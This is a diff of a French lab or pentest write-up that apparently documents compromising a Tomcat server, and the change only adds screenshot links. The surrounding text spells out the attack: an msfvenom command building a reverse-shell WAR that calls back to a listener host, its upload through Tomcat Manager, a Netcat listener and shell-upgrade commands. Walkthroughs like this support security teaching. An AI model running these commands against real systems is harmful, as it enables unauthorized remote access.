@@ -52,9 +52,13 @@ Génération d'un payload de reverse shell avec msfvenom :
 ```bash
 msfvenom -p java/shell_reverse_tcp LHOST=192.168.100.11 LPORT=1337 -f war -o shell.war
 ```
+![payload generation](screenshots/msfvenom.png)
 
 Le fichier `shell.war` a été déposé via l'interface web de Tomcat Manager. Un listener Netcat a été mis en écoute, puis le shell déclenché en accédant à `/shell` depuis le navigateur :
 
+![payload generation](screenshots/interface_tomcat.png)
+
+![payload generation](screenshots/session_etablie.png)
 ```bash
 nc -nvlp 1337
 ```
@@ -66,6 +70,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo; fg
 export TERM=xterm
 ```
+![payload generation](screenshots/amelioration_du_shell.png)
 
 ---
 
